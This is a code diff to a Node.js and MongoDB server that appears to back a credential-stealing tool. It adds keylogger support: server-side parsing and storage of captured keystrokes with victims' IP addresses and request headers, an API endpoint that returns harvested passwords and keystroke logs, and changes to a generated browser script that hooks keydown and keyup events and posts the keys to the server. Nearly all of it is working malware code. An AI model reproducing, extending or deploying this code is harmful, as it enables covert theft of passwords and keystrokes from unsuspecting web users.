@@ -193,7 +193,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 									},
 									created_at	: Math.round(new Date().getTime() / 1000)
 								},
-								records		: []
+								passwords		: [],
+								keylogger		: []
 							}, (err, res) => {
 								if (err) {
 									throw err
@@ -483,7 +484,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				let project			= "a",
 					type			= "t",
 					username		= "b",
+					identifier		= "b",
 					password		= "c",
+					keys			= "c",
 					url				= "d",
 					width			= "e",
 					height			= "f",
@@ -538,6 +541,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 
 									}
 									if(record[type] == 0) {
+										// Password logger
 										try {
 											if(record[cookies]) {
 												var pairs = record[cookies].split(";")
@@ -558,7 +562,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										},
 										{
 											$push: {
-												records: {
+												passwords: {
 													timestamp	: Math.round(new Date().getTime() / 1000),
 													username	: record[username],
 													password	: record[password],
@@ -579,6 +583,78 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										}).then(() => {
 											resolve("wrote record to database")
 										})
+									} else if (record[type] == 1) {
+										// Keylogger
+										let timestamp = Math.round(record[identifier] / 1000).toString()
+										// If the length is greater than 10,
+										if (record[keys] && timestamp.length == 10) {
+											let keystrokes = []
+											try {
+												for (i = 0; i < record[keys].length; i++) {
+													let key = record[keys][i]
+													let keytype = "keydown"
+													if (key.endsWith("_") && key.length != 1) {
+														key = key.slice(0,-1)
+														keytype = "keyup"
+													}
+													let keyname = key
+													
+													if (keyname && keytype) {
+														keystrokes.push('[' + keytype + ' ' + keyname + ']')
+													} else {
+														reject("invalid keylogger keycode")
+														break
+													}
+												}
+											} catch(e) {
+												reject("failed to parse keylogger array")
+												throw e
+											}
+											projects.updateOne({
+												'name': record[project],
+												'keylogger.timestamp': timestamp
+											},
+											{
+												$addToSet: {
+													'keylogger.$.keys' : keystrokes
+												}
+											}).then((e) => {
+												if(e.result.nModified == 0) {
+													// Add new keylogger record
+													projects.updateOne({
+														name: record[project]
+													},
+													{
+														$push: {
+															keylogger: {
+																timestamp	: timestamp,
+																ip			: ip,
+																browser: {
+																	headers	: req.headers
+																},
+																keys : [
+																	keystrokes
+																]
+															}
+														}
+													}).then(() => {
+														resolve("wrote record to database")
+													})
+												} else {
+													resolve("wrote log to database")
+												}
+											})
+										} else {
+											if (timestamp.length == 10 && !record[keys]) {
+												reject("keylogger value(s) not specified")	
+											} else if (record[keys] && timestamp.length != 10) {
+												reject("keylogger identifier not specified")
+											} else {
+												reject("keylogger identifier & value(s) not specified")	
+											}
+										}
+									} else {
+										reject("invalid / missing record type")	
 									}
 								})
 							} else {
@@ -687,14 +763,21 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				} else {
 					res.setHeader('Content-Type', 'application/json')
 				}
-				json = JSON.stringify(json.records, null, "    ")
-				res.send(json)
-				console.log(
-					chalk.greenBright("[API] ") +
-					chalk.yellowBright("delivered ") +
-					chalk.magentaBright(project) +
-					chalk.redBright(" (length=" + json.length + ")")
-				)
+				if (json.passwords && json.keylogger) {
+					json = JSON.stringify(json.passwords, null, "    ") + ",\n" + JSON.stringify(json.keylogger, null, "    ")
+					res.send(json)
+					console.log(
+						chalk.greenBright("[API] ") +
+						chalk.yellowBright("delivered ") +
+						chalk.magentaBright(project) +
+						chalk.redBright(" (length=" + json.length + ")")
+					)
+				} else {
+					res.send(JSON.stringify({
+						title: "Database error",
+						message: "An internal error occured whilst handling your request"
+					}, null, "    "))
+				}
 			}).catch(error => {
 				res.setHeader('Content-Type', 'application/json')
 				res.send(JSON.stringify(error, null, "    "))
@@ -774,16 +857,15 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				body		= ''
 
 			if (keylogger) {
-				variables += 'm = {}, f = [],'
-				header += `
-					`+ comment("add listeners to the window for keydown & keyup events") + `
+				variables += 'm = {}, f = [], g = new Date().getTime(),'
+				header += comment("add listeners to the window for keydown & keyup events") + `
 					k.onkeydown = b
 					k.onkeyup = b
 				`
 				body += `
 					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
 						n.type.slice(-1) == 'p' ? l = '_' : l = ''
-						h = n.keyCode
+						h = n.key
 						if(!h) return
 						z = h + l` + comment("ignore multiple modifier calls") + `
 						if(m == z) return` + comment("Push to array") + `
@@ -804,7 +886,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							JSON.stringify({
 								a: atob("` + btoa(req.query.project) + `"),
 								t: 1,
-								b: f
+								b: g,
+								c: f
 							})
 						)
 						f = []
